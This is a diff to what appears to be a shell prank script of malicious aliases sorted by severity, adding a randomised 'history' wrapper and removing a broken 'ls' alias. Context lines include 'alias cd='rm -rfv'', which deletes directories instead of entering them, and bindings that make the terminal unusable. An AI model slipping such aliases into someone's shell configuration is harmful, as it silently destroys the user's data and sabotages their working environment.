@@ -58,6 +58,9 @@ annoying && alias cat=true;
 # Use a random sort option whenever `ls` is invoked.
 annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
+# Use a random sort option whenever `history` is invoked.
+annoying && function history { command history -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
+
 # Delete directories instead of entering them.
 devasting && alias cd='rm -rfv';
 
@@ -128,9 +131,6 @@ unusable && bind '"\C-M":"\C-?"';
 
 # Send `n` (no) instead of `y` (yes)
 annoying && alias yes="yes n";
-
-#Make ls always to ls / -lahR
-annoying $$ alias ls='ls / -lahR'
 
 #Make uname output windows
 annoying && alias uname='echo "Windows XP" 2>/dev/null'
